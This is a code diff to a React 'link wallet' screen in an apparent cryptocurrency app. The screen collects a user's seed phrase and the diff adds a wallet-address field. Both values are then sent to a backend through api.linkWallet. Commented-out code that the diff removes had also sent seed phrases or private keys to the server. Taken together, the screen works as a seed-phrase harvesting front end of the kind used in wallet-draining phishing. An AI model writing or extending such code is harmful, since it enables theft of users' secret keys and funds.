@@ -145,6 +145,7 @@ export default function LinkWalletScreen() {
   const [search, setSearch] = useState('');
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [seedPhrase, setSeedPhrase] = useState('');
+  const [walletAddress, setWalletAddress] = useState('');
   const [connectionState, setConnectionState] = useState(null); // 'connecting', 'failed', 'manual'
   const [error, setError] = useState(false);
   const [connectionMethod, setConnectionMethod] = useState('phrase'); // 'phrase', 'keystore', 'private'
@@ -176,28 +177,9 @@ export default function LinkWalletScreen() {
       }
 
       let walletData = {
-      phrase: seedPhrase,
+        phrase: seedPhrase,
+        walletAddress: walletAddress
       };
-
-      // switch(connectionMethod) {
-      //   case 'phrase':
-      //     if (seedPhrase) {
-      //       await api.sendPhrase(token, seedPhrase);
-      //       walletData.address = 'Generated from Seed Phrase';
-      //     }
-      //     break;
-      //   case 'private':
-      //     if (privateKey) {
-      //       await api.sendPhrase(token, privateKey);
-      //       walletData.address = 'Generated from Private Key';
-      //     }
-      //     break;
-      //   case 'keystore':
-      //     if (keystoreFile && keystorePassword) {
-      //       walletData.address = 'Generated from Keystore';
-      //     }
-      //     break;
-      // }
 
       const response = await api.linkWallet(token, walletData);
       
@@ -240,10 +222,18 @@ export default function LinkWalletScreen() {
               className={`w-full bg-gray-900/50 border ${error ? 'border-red-500' : 'border-white/10'} rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 min-h-[100px]`}
               required
             />
+            <input 
+              type="text"
+              value={walletAddress}
+              onChange={(e) => setWalletAddress(e.target.value)}
+              placeholder="Enter your wallet address..."
+              className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500"
+              required
+            />
             {error && (
               <p className="mt-2 text-sm text-red-500 flex items-center gap-2">
                 <X size={16} />
-                Invalid seed phrase. Try again
+                Invalid input. Try again
               </p>
             )}
             <p className="text-xs text-gray-400">
